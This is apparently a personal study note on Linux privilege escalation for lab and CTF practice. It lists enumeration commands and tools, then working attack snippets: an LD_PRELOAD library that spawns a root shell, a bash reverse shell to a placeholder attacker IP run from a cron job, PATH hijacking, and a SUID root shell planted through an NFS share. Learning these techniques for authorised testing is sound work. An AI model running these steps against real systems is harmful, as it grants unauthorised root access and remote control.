# Linux Privilege Escalation

### Enumeration

#### `hostname`

Returns the hostname of the target machine

#### `uname -a`

Prints system information giving us additional information about the kernel used

#### `/proc/version`

The proc filesystem (procfs) provides information about the target system processes. May
give information on the kernel version and additional data such as whether a compiler is 
installed

#### `/etc/issue`

This file usually contains information about the operating system but can be customized or 
changed

#### `ps`

List running processes `ps -A` for all running processes, `ps axjf` view process tree, 
`ps aux` for all users (a) user that launched the process (u) and processes not attached to 
a terminal (x)

#### `env`

Show environment variables, PATH may have a compiler or scripting language that can be used 
for code execution or privilege escalation

#### `sudo -l`

List commands that can be run as sudo for the current user

#### `ls`

Use `ls -al` to find hidden files

#### `id`

Will provide an overwiew of the users privilege level, use `id <USER>` to specify the user

#### `/etc/passwd`

Shows users of the system. Use `cat /etc/passwd | cut -d ":" -f 1` to extract the usernames 
or `cat /etc/passwd | grep home` to find users with home directories

#### `history`

Check for commands and typos exposing usernames and passwords

#### `ifconfig`

The target system may be a pivot point to another network. Show network interfaces of the 
system and confimr network routes with `ip route`

#### `netstat`

Gather information on existing connections. 

- `-a` shows all listening ports and established connections
- `-at` or `-au` lists TCP or UDP protocols respectively
- `-l` lists ports in listening mode (add t to list ports listening using TCP protocol) 
- `-s` list network usage statistics by protocol, add t or u for TCP or UDP
- `-tp` list connections with the service name and PID information, add l for listening ports
- `-i` shows interface statistics
- `-ano` to display all sockets (a), don't resolve names (n), (o) display timers

#### `find`

Searches the system. Can generate a lot of errors so best used with `2>/dev/null`

Find files:

- `find . -name flag1.txt`: find the file named “flag1.txt” in the current directory
- `find /home -name flag1.txt`: find the file names “flag1.txt” in the /home directory
- `find / -type d -name config`: find the directory named config under “/”
- `find / -type f -perm 0777`: find files with 777 permissions
- `find / -perm a=x`: find executable files
- `find /home -user frank`: find all files for user “frank” under “/home”
- `find / -mtime 10`: find files that were modified in the last 10 days
- `find / -atime 10`: find files that were accessed in the last 10 days
- `find / -cmin -60`: find files changed within the last hour (60 minutes)
- `find / -amin -60`: find files accesses within the last hour (60 minutes)
- `find / -size 50M`: find files 50 MB in size
- `find / -size -50M`: find files less than 50 MB in size
- `find / -size +50M`: find files greater than 50 MB in size

Find world writable and executable files and folders:

- `find / -writable -type d 2>/dev/null`: Find world-writeable folders
- `find / -perm -222 -type d 2>/dev/null`: Find world-writeable folders
- `find / -perm -o w -type d 2>/dev/null`: Find world-writeable folders
- `find / -perm -o x -type d 2>/dev/null`: Find world-executable folders

Find development tools and supported languages:

- `find / -name *perl`
- `find / -name *python`
- `find / -name *gcc`

Find specific file permissions:

- `find / -perm -u=s -type f 2>/dev/null`

### Automated Enumeration Tools

[LinPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
[LinEnum](https://github.com/rebootuser/LinEnum)
[LES (Linux Exploit Suggester)](https://github.com/mzet-/linux-exploit-suggester)
[Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
[Linux Priv Checker](https://github.com/linted/linuxprivchecker)

### Privilege Escalation: Kernel Exploits

Used `uname -a` to find the kernel version 3.13.0-24-generic, `searchsploit '3.13' 'kernel'`
to find exploits for that kernel version. Tried a couple but got the error: 
version \`GLIBC_2.34' not found. After googling found out it needed to be compiled with the 
`-static` tag `gcc /path/to/exploit -static -o exploit-output`. Used linux/local/37292.c 
from searchsploit and got a root shell

Hints/Notes:

[Linux Kernel CVEs](https://www.linuxkernelcves.com/cves)

1. Being too specific about the kernel version when searching for exploits on Google, 
Exploit-db, or searchsploit

2. Be sure you understand how the exploit code works BEFORE you launch it. Some exploit 
codes can make changes on the operating system that would make them unsecured in further 
use or make irreversible changes to the system, creating problems later. Of course, these 
may not be great concerns within a lab or CTF environment, but these are absolute no-nos 
during a real penetration testing engagement.

3. Some exploits may require further interaction once they are run. Read all comments and 
instructions provided with the exploit code.

4. You can transfer the exploit code from your machine to the target system using the 
SimpleHTTPServer Python module and wget respectively.

### Privilege Escalation: Sudo

`sudo -l` to check root privileges, [GTFOBins](https://gtfobins.github.io/) to find binaries
we can exploit.

**Application Functions**

Leverage application functions like Apache2 server's `-f` to read files with root 
permissions (first lines in this case).

**LD_PRELOAD**

If `env_keep+=LD_PRELOAD` is enabled we can generate a shared library that will be loaded 
and executed before the program is.

*Note: The LD_PRELOAD option will be ignored if the real user ID is different from the 
effective user ID.*

C code to spawn a root shell:

```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
	unsetenv("LD_PRELOAD");
	setgid(0);
	setuid(0);
	system("/bin/bash");
}
```

Save it and compile as a shared library:

`gcc -fPIC -shared -o shell.so shell.c -nostartfiles`

Run a program with the LD_PRELOAD option set

`sudo LD_PRELOAD=/path/to/shell.so find`

### Privilege Escalation: SUID

List all files with SUID or SGID set

`find / -type f -perm -04000 -ls 2>/dev/null`

Find binaries on GTFOBins may not be an auto root, may need intermediate steps e.g you can
use base64 to read files requiring root privileges if the bit is set.

### Privilege Escalation: Capabilities

Another method system administrators can use to increase the privilege level of a process 
or binary is “Capabilities”. Capabilities help manage privileges at a more granular level. 

Use `getcap` to list enabled capabilities and find binaries on GFTFOBins

### Privilege Escalation: Cron Jobs

Find cronjobs in `/etc/crontab`, look for jobs running at elevated privileges and jobs 
whose script has been removed but not the job itself.

As netcat usually won't have the `-e` option use bash or other available scripting 
languages for the reverse shell.

```
#!/bin/bash

bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1
```

### Privilege Escalation: PATH

Questions to answer:

1. What folders are located under $PATH
2. Does your current user have write privileges for any of these folders?
3. Can you modify $PATH?
4. Is there a script/application you can start that will be affected by this vulnerability?

Find writable folders with `find / -writable 2>/dev/null`

Example:

Find writable folder `/writable/path` and `test` binary (SUID bit set), which executes thm, 
inside. 

Add writable directory fo PATH, run `echo "cat /path/to/flag" > thm; chmod 777 thm` and 
`./test` to execute the `cat` command in `thm` displaying the flag file contents.

### Privilege Escalation: NFS

NFS config is found in the `/etc/exports` files

Enumerate mountable shares with `showmount -e <TARGET-IP>`

Mount a share

`mount -o rw <TARGET-IP>:/path/to/share /tmp/nfs`

Write basic root shell in the share

```
int main(){
    setgid(0);
    setuid(0);
    system("/bin/bash");
    return 0;
}
```

Compile it and set SUID bit

`gcc shell.c -o shell; chmod +s shell`

Execute the shell binary to gain a root shell 
